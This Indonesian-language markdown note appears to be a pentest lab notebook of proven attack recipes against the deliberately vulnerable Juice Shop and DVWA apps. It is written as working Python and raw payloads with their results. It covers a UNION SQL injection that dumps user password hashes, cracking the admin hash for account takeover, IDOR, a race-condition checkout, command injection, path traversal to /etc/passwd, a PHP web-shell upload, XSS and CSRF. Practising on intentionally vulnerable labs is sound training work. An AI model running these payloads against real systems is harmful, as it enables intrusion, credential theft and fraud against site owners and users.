# Juice Shop 20.3.0 + DVWA 1.10 — probe recipes yang TERBUKTI

Hasil kalibrasi nyata di lab lokal (Docker di WSL2). Semua baris menghasilkan **bukti**,
bukan cuma status 200. Skrip asli: `lab_prove_v3.py`, `lab_chain.py`, `lab_race.py`,
`dvwa_matrix.py` (di `$LOCALAPPDATA/Temp`).

## Juice Shop (localhost:3000)

### Sesi & bid sendiri (fondasi semua uji IDOR)
```python
S.post("/api/Users", json={"email": EM, "password": pw, "passwordRepeat": pw,
                           "securityQuestion": {"id": 1}, "securityAnswer": "blue"})
TOK = S.post("/rest/user/login", json={"email": EM, "password": pw}).json()["authentication"]["token"]
claim = json.loads(base64.urlsafe_b64decode(TOK.split(".")[1] + "=="))
BID = claim["bid"]      # id keranjang ADA di JWT — jangan tebak
```
Tanpa `BID` sendiri, `GET /rest/basket/1` → 200 terlihat seperti BOLA padahal itu basket sendiri.

### SQL injection — jumlah kolom = **10** di 20.3.0
Kalibrasi dulu:
```python
for n in range(6, 13):
    cols = ",".join(str(i) for i in range(1, n + 1))
    r = S.get("/rest/products/search", params={"q": "')) UNION SELECT %s FROM Users--" % cols})
```
6–9 → `SQLITE_ERROR: SELECTs to the left and right ... same number of result columns`;
**10 → 200**; 11 → error. Payload final:

```
q=')) UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--
```

→ 87 baris, 30 pasang email:md5. `admin@juice-sh.op` = `0192023a7bbd73250516f069df18b500`
(md5 `admin123`).

Catatan: error 500 dengan `<title>Error: SQLITE_ERROR...` adalah oracle kolom — parse keduanya,
bukan hanya respons 200.

### SQLi → ATO (rangkai, jangan berhenti di dump)
```python
for w in WORDLIST:                       # admin123 langsung kena
    if hashlib.md5(w.encode()).hexdigest() == h: ...
r = S.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})  # 200 + token
S.get("/rest/admin/application-version", headers={"Authorization": "Bearer " + tok})         # 200 = benar admin
```
Bukti "benar admin" = endpoint admin-only tembus, bukan cuma login 200.

### IDOR / BOLA
`GET /rest/basket/{1..4}` dengan sesi sendiri → 200 + `UserId=1,2,3,11`, isi nyata
(basket 2 = Raspberry Juice ×2). **Kontrol wajib:** anon `GET /rest/basket/{BID}` → 401.
401 anon + 200 user lain = *authz gap*. Kalau anon juga 200 → auth hilang, kelas berbeda.

### Business logic — negative quantity
```
POST /api/BasketItems {"ProductId":1,"quantity":-3,"BasketId":"<BID>"}  -> 200
GET  /api/BasketItems?BasketId=<BID>                                    -> quantity:-3 MASIH ADA
POST /rest/basket/<BID>/checkout                                        -> 200 + orderConfirmation
```
Bukti = **re-read setelah write**. Tanpa itu, 200 bisa berarti no-op.

### Race — metrik = jumlah order
```
1 keranjang, 12 thread POST /rest/basket/<BID>/checkout paralel
-> 12x 200, 12 orderConfirmation BERBEDA
-> /rest/order-history: 0 -> 12 order
```
`threading.Thread` + `Counter(status)`; klaim race HARUS pakai delta jumlah objek.
Penghitung order yang benar = `/rest/order-history` (bukan `/api/Orders` — itu 500).

### ATO via security question — PARTIAL
`GET /rest/user/security-question?email=admin@juice-sh.op` → 200 + `"Mother's maiden name?"`
(enumeration + pertanyaan bocor = proven). Reset butuh jawaban → **takeover tidak diklaim**.
Perhatikan domain: `admin@juice-sh.op` (`.op`), bukan `.sh`. Email salah → `{}`.

### SSRF — RETRACTED di env Docker
Semua 13 payload → `500 Blocked illegal activity by ::ffff:172.17.0.1`; kontrol benign juga
diblok dengan pesan sama → artefak NAT, bukan SSRF. Lihat SKILL.md §1.

## DVWA (localhost:4280)

### Urutan setup yang benar
```python
s.post("/setup.php", data={"create_db": "Create / Reset Database", "user_token": tok("/setup.php")})
s.post("/login.php", data={"username":"admin","password":"password","Login":"Login",
                           "user_token": tok("/login.php")})           # -> index.php = SUKSES
s.post("/security.php", data={"security":"low","seclevelsubmit":"Submit",
                              "user_token": tok("/security.php")})      # verifikasi cookie security=low
```

### Trap yang menghabiskan ronde
- `302` setelah POST `/login.php` = **LOGIN SUKSES** (redirect index.php), bukan gagal. Cek `r.url`.
- CSRF token **rotate per request** → ambil `user_token` dari halaman yang sama tepat sebelum POST.
  Token stale → form dirender ulang, terlihat "sukses" tanpa eksekusi.
- Tombol submit di `exec` bernama **`Submit`** (kapital). Kirim `submit` → form tidak diproses.
- Output perintah ada di `<pre>`: `re.findall(r"<pre>(.*?)</pre>", r.text, re.S)`.
  Jangan `"uid=" in r.text` — string itu muncul juga di HTML lain.
- Setelah buktikan CSRF password-change, **revert** ke `admin`/`password`.

### Kelas yang terbukti per-halaman
| Halaman | Payload | Bukti |
|---|---|---|
| `exec` | `ip=127.0.0.1;id` + `Submit` | `uid=33(www-data) gid=33(www-data)` |
| `sqli` | `' UNION SELECT user,password FROM users-- -` | `5f4dcc3b5aa765d61d8327deb882cf99` (md5 `password`) |
| `sqli` | `1' OR '1'='1` | 5 baris `First name:` |
| `sqli_blind` | `1' AND SLEEP(3)-- -` | 3.03s vs kontrol 0.01s |
| `fi` | `"../"*5 + "etc/passwd"` | `/etc/passwd` (depth 2–4 GAGAL, 5 berhasil) |
| `fi` | `../../../../../proc/self/cmdline` | `/usr/sbin/apache2 -k start` |
| `upload` | `.php` + Content-Type `image/png` | `/hackable/uploads/x.php?c=id` → `uid=33` |
| `xss_s` | `<script>alert('mrk')</script>` di `mtxMessage` | persist unescaped pada re-GET |
| `xss_r` | `?name=<script>alert('XSS')</script>` | reflected mentah |
| `csrf` | `?password_new=hacked&password_conf=hacked&Change=Change` | "Password Changed" tanpa token |

`fi.php` butuh **5** `../` karena letaknya ~5 level di bawah document root compose.

## Cakupan yang belum punya sink hidup di lab ini

SSRF / webhook / deserialization / XXE / SSTI / HTTP smuggling **belum terkalibrasi**:
Juice Shop tidak punya sink SSRF yang lolos filter (di env ini), DVWA tidak punya XXE.
Kalau butuh kalibrasi kelas itu, tambah container (`vulhub/*`) atau bikin sink sendiri —
jangan mengklaim kelas itu "sudah teruji" hanya karena container hidup.
